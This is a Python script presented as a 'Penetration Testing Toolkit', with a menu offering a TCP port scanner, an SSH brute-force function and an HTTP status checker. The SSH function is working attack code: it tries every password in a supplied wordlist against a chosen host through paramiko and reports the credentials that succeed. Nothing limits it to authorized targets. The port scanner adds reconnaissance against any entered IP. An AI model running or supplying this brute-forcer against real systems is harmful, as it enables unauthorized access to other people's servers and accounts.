import socket
import paramiko
import requests

# Port Scanner
def port_scanner(target, ports):
    print(f"Scanning {target} for open ports...")
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                print(f"[+] Port {port} is open")
            s.close()
        except Exception as e:
            print(f"Error scanning port {port}: {e}")

# SSH Brute Force
def ssh_brute_force(target, username, password_list):
    print(f"Starting SSH brute-force on {target}...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in password_list:
        try:
            ssh.connect(target, username=username, password=password, timeout=3)
            print(f"[+] Success! Username: {username}, Password: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password}")
        except paramiko.SSHException:
            print("[!] Rate limit exceeded, try again later.")
            break
        except Exception as e:
            print(f"Error: {e}")
            continue

# HTTP Status Checker
def http_status_checker(url):
    try:
        response = requests.get(url, timeout=5)
        print(f"[+] {url} is online. Status Code: {response.status_code}")
    except requests.ConnectionError:
        print(f"[-] {url} is offline.")

# Main Menu
if __name__ == "__main__":
    print("\n[+] Penetration Testing Toolkit")
    print("1. Port Scanner")
    print("2. SSH Brute Force")
    print("3. HTTP Status Checker")

    choice = input("Choose an option: ")

    if choice == "1":
        target_ip = input("Enter target IP: ")
        ports = list(map(int, input("Enter ports to scan (comma-separated): ").split(',')))
        port_scanner(target_ip, ports)

    elif choice == "2":
        target_ip = input("Enter target IP: ")
        username = input("Enter SSH username: ")
        password_file = input("Enter password list file path: ")

        try:
            with open(password_file, "r") as file:
                passwords = [line.strip() for line in file.readlines()]
            ssh_brute_force(target_ip, username, passwords)
        except FileNotFoundError:
            print("[-] Password file not found!")

    elif choice == "3":
        url = input("Enter the website URL: ")
        http_status_checker(url)

    else:
        print("[-] Invalid option!")
